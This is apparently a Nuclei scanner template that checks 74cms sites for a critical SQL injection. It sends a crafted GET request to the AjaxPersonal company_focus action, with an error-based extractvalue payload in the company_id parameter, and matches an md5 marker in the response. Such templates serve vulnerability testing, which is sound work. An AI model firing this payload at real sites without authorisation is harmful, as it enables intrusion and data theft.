id: 74cms-sqli

info:
  name: 74cms SQL注入漏洞
  author: HuanXiong
  severity: critical
  description: |
    74cms系统中存在SQL注入漏洞，攻击者可以通过构造恶意请求获取敏感数据或执行任意SQL命令。
  tags: sqli,sql-injection

http:
  - raw:
      - |
        GET /index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=test") and extractvalue(1,concat(0x7e,md5({{num}}))) -- a HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
        Connection: close

    matchers:
      - type: dsl
        name: SQL注入
        dsl: "contains(body, '{{md5({{num}})}}')"
